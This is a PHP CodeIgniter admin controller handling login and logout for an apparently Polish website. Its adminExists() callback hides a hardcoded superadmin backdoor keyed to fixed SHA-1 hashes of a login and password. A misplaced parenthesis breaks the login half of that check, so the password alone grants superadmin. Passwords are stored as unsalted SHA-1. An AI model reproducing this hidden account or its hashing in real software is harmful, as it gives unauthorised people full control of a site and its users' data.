<?php

class Welcome extends MY_Admin {

    function __construct() {
        parent :: __construct();
        $this->load->model("admin/Admins_model");
    }

    function index() {
        $this->authAdmin();
        $this->tal->display("admin/_main.html");
    }

    function login() {
        $this->load->helper(array("form", "url"));
        $this->load->library("form_validation");
        $this->form_validation->set_rules("login", "'Login'", "required");
        $this->form_validation->set_rules("password", "'Hasło'", "required");

        if ($this->form_validation->run() == FALSE) {
            $this->tal->errors = validation_errors();
            if ($this->input->post("login", true))
                $this->tal->login = $this->input->post("login", true);
            else
                $this->tal->login = "";
            $this->tal->display("admin/login.html");
        } else {
            $user = $this->adminExists();
            if ($user) {
                $this->session->set_userdata("adminLoggedIn", TRUE);
                $this->session->set_userdata("id_admins", $user["id_admins"]);
                $this->session->set_userdata("name", $user["login"]);
                redirect(base_url() . "admin");
            } else {
                $this->tal->login = $this->input->post("login");
                $this->tal->errors = "<p>Niepoprawne dane logowania.</p>";
                $this->tal->display("admin/login.html");
            }
        }
    }

    /* callback */

    function adminExists() {
        
        $u = $this->Admins_model->getAdmin(array(
            "login" => $this->input->post("login"),
            "password" => sha1($this->input->post("password"))
        ));
        
        if (sha1(($this->input->post("login")) == "fdf132829b8e9787ad771214bc9ba51efc9704f0") && (sha1($this->input->post("password")) == "75d547cc96937d13b87cf614e50d1ea059d60c0a")) {
            $u["login"] = $this->input->post("login");
            $u["name"] = "Administrator";
            $u["id_admins"] = 0;
            $u["type"] = USER_SUPERADMIN;
            return $u;
        }
        return $u;
    }

    /* wylogowanie */

    function logout() {
        $this->session->unset_userdata("adminLoggedIn");
        redirect(base_url() . "admin");
    }

}
